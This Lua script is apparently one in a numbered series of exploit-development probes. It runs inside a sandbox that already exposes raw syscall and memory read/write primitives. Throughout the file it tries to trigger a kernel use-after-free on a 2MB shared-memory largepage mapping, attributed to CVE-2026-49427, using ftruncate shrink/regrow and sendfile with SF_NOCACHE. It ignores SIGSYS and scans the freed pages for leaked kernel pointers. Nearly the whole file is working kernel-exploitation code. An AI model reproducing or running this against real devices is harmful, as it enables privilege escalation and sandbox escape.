-- CRASH_CLASS: HIGH
-- PROBE 391b: Trigger page free on shm largepage mapping
--
-- Context: 391a confirmed shm_open + ftruncate(2MB) + mmap(MAP_ALIGNED_SUPER).
-- This probe tests two UAF triggers:
-- 1. sendfile(SF_NOCACHE) on shm fd — CVE-2026-49427
-- 2. ftruncate to 0 then regrow — tests if pages are replaced
-- After trigger, scan mapping for kernel pointers.

print("=== PROBE 391b: page free trigger ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local function zero_buf(addr, len)
    for i = 0, len - 4, 4 do wd(N(addr) + i, 0) end
end

-- Ignore SIGSYS
local act = memory.alloc(0x40)
zero_buf(act, 0x40)
wq(N(act), uint64(1))
pcall(function() mk(416)(uint64(12), act, uint64(0)) end)
print("SIGSYS ignored")

local SHM_SIZE = 0x200000  -- 2MB
local PAGE_SIZE = 0x4000   -- 16KB

-- ===================================================================
-- [A] Create shm + largepage mapping + fill pattern
-- ===================================================================
print("[A] setup")

local sc482 = mk(482)
local shm_fd = -1
local ok1, rv1 = pcall(function()
    return sc482(uint64(1), uint64(0x202), uint64(0x180))
end)
if ok1 then shm_fd = N(rv1) end
print("  shm_open(SHM_ANON): fd=" .. shm_fd)
if shm_fd < 0 then print("FAIL shm_open"); return end

local ok2, rv2 = pcall(function()
    return mk(480)(uint64(shm_fd), uint64(SHM_SIZE))
end)
local ret_ft = ok2 and N(rv2) or -1
print("  ftruncate: ret=" .. ret_ft)
if ret_ft ~= 0 then print("FAIL ftruncate"); return end

local shm_map = nil
local ok3, rv3 = pcall(function()
    return mk(477)(uint64(0), uint64(SHM_SIZE), uint64(3),
        uint64(0x01000001), uint64(shm_fd), uint64(0))
end)
if ok3 then
    local h, l = get_hi_lo(rv3)
    if h ~= 0xFFFFFFFF or l ~= 0xFFFFFFFF then
        shm_map = rv3
        print(string.format("  mmap: 0x%X%08X", h, l))
    end
end
if not shm_map then print("FAIL mmap"); return end

-- Fill with pattern: 0xAAAAAAAA at start of each page
local map_addr = N(shm_map)
for page_off = 0, SHM_SIZE - PAGE_SIZE, PAGE_SIZE do
    wd(map_addr + page_off, 0xAAAAAAAA)
    wd(map_addr + page_off + 4, 0xBBBBBBBB)
    wd(map_addr + page_off + 8, 0xCCCCCCCC)
    wd(map_addr + page_off + 12, 0xDDDDDDDD)
end
print("  pattern filled (" .. (SHM_SIZE / PAGE_SIZE) .. " pages)")

if not alive() then print("DEAD after setup"); return end
print("")

-- ===================================================================
-- [B] Trigger 1: ftruncate shrink to 0, then regrow
-- This is simpler than sendfile and tests page lifecycle
-- ===================================================================
print("[B] ftruncate shrink/regrow trigger")

-- Shrink to 0
local ok_t0, rv_t0 = pcall(function()
    return mk(480)(uint64(shm_fd), uint64(0))
end)
print("  ftruncate(0): ret=" .. (ok_t0 and N(rv_t0) or -1))

-- Regrow to 2MB
local ok_t1, rv_t1 = pcall(function()
    return mk(480)(uint64(shm_fd), uint64(SHM_SIZE))
end)
print("  ftruncate(2MB): ret=" .. (ok_t1 and N(rv_t1) or -1))

-- Check first page
local post_d0 = rd(map_addr)
local post_d1 = rd(map_addr + 4)
if post_d0 == nil then
    print("  page 0: UNREADABLE *** SIGBUS = pages freed ***")
elseif post_d0 == 0 and post_d1 == 0 then
    print("  page 0: ZEROED *** FRESH PAGES ***")
elseif post_d0 == 0xAAAAAAAA and post_d1 == 0xBBBBBBBB then
    print("  page 0: UNCHANGED (same physical pages)")
else
    print(string.format("  page 0: 0x%08X 0x%08X *** NEW DATA ***", post_d0 or 0, post_d1 or 0))
end

if not alive() then print("DEAD after truncate trigger"); return end

-- Scan all pages for changes
local changed_t = 0
local zeroed_t = 0
local kptr_t = 0
for page_off = 0, SHM_SIZE - PAGE_SIZE, PAGE_SIZE do
    local d = rd(map_addr + page_off)
    if d == nil then
        changed_t = changed_t + 1
    elseif d ~= 0xAAAAAAAA then
        changed_t = changed_t + 1
        if d == 0 then zeroed_t = zeroed_t + 1 end

        -- Check for kernel pointers in first 64 bytes of changed page
        for qoff = 0, 56, 8 do
            local q = rq(map_addr + page_off + qoff)
            if q then
                local h, l = get_hi_lo(q)
                if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                    kptr_t = kptr_t + 1
                    if kptr_t <= 10 then
                        print(string.format("  +0x%06X+%d: 0x%X%08X *** KPTR ***",
                            page_off, qoff, h, l))
                    end
                end
            end
        end
    end
end
print(string.format("  truncate: %d/%d changed, %d zeroed, %d kptrs",
    changed_t, SHM_SIZE / PAGE_SIZE, zeroed_t, kptr_t))
print("")

-- ===================================================================
-- [C] Re-fill and try sendfile trigger
-- ===================================================================
print("[C] sendfile trigger")

-- Re-fill pattern
for page_off = 0, SHM_SIZE - PAGE_SIZE, PAGE_SIZE do
    wd(map_addr + page_off, 0xAAAAAAAA)
    wd(map_addr + page_off + 4, 0xBBBBBBBB)
end
print("  re-filled pattern")

-- Create pipe (lighter weight than socket for sendfile)
local pipe_buf = memory.alloc(16)
zero_buf(pipe_buf, 16)
local ok_p, rv_p = pcall(function()
    return mk(42)(pipe_buf)  -- pipe(2) — but this might not work via make_syscall
end)
local ret_pipe = ok_p and N(rv_p) or -1
local pipe_r = rd(N(pipe_buf)) or -1
local pipe_w = rd(N(pipe_buf) + 4) or -1
print(string.format("  pipe: ret=%d fds=%d,%d", ret_pipe, pipe_r, pipe_w))

-- If pipe failed, try socketpair
local out_fd = pipe_w
local in_fd = pipe_r
if ret_pipe ~= 0 or pipe_w <= 0 then
    local sv = memory.alloc(16)
    zero_buf(sv, 16)
    local ok_sp, rv_sp = pcall(function()
        return mk(135)(uint64(1), uint64(1), uint64(0), sv)  -- AF_UNIX SOCK_STREAM
    end)
    local ret_sp = ok_sp and N(rv_sp) or -1
    in_fd = rd(N(sv)) or -1
    out_fd = rd(N(sv) + 4) or -1
    print(string.format("  socketpair: ret=%d fds=%d,%d", ret_sp, in_fd, out_fd))
end

if out_fd <= 0 then
    print("  no output fd — skip sendfile")
else
    -- Make output non-blocking
    local one = memory.alloc(8)
    wd(N(one), 1)
    pcall(function() mk(54)(uint64(out_fd), uint64(0x8004667E), one) end)

    -- sendfile: send ONE page with SF_NOCACHE, non-blocking
    local sb = memory.alloc(8)
    zero_buf(sb, 8)
    local ok_sf, rv_sf = pcall(function()
        return mk(393)(uint64(shm_fd), uint64(out_fd), uint64(0),
            uint64(PAGE_SIZE), uint64(0), sb, uint64(0x10))
    end)
    local ret_sf = ok_sf and N(rv_sf) or -999
    local sent = rd(N(sb)) or 0
    print(string.format("  sendfile(1 page, SF_NOCACHE): ret=%d sbytes=%d", ret_sf, sent))

    -- Drain
    if sent > 0 and in_fd > 0 then
        local drain = memory.alloc(0x4000)
        pcall(function() mk(3)(uint64(in_fd), drain, uint64(0x4000)) end)
        print("  drained")
    end

    -- Send more pages
    local total = sent
    if sent > 0 then
        for i = 1, 30 do
            if not alive() then break end
            zero_buf(sb, 8)
            local ok2, rv2 = pcall(function()
                return mk(393)(uint64(shm_fd), uint64(out_fd), uint64(total),
                    uint64(PAGE_SIZE), uint64(0), sb, uint64(0x10))
            end)
            local s = rd(N(sb)) or 0
            if s > 0 then
                total = total + s
                -- drain
                pcall(function() mk(3)(uint64(in_fd), memory.alloc(0x4000), uint64(0x4000)) end)
            else
                break
            end
        end
        print(string.format("  total sent: %d bytes", total))
    end

    if not alive() then print("DEAD after sendfile"); return end

    -- Check mapping after sendfile
    local changed_s = 0
    local kptr_s = 0
    for page_off = 0, SHM_SIZE - PAGE_SIZE, PAGE_SIZE do
        local d = rd(map_addr + page_off)
        if d ~= nil and d ~= 0xAAAAAAAA then
            changed_s = changed_s + 1
            for qoff = 0, 56, 8 do
                local q = rq(map_addr + page_off + qoff)
                if q then
                    local h, l = get_hi_lo(q)
                    if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                        kptr_s = kptr_s + 1
                        if kptr_s <= 10 then
                            print(string.format("  +0x%06X+%d: 0x%X%08X *** KPTR ***",
                                page_off, qoff, h, l))
                        end
                    end
                end
            end
        elseif d == nil then
            changed_s = changed_s + 1
        end
    end
    print(string.format("  sendfile: %d/%d changed, %d kptrs",
        changed_s, SHM_SIZE / PAGE_SIZE, kptr_s))
end

if not alive() then print("DEAD"); return end
print("")

-- Cleanup
pcall(function() mk(6)(uint64(shm_fd)) end)

print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 391b COMPLETE ===")
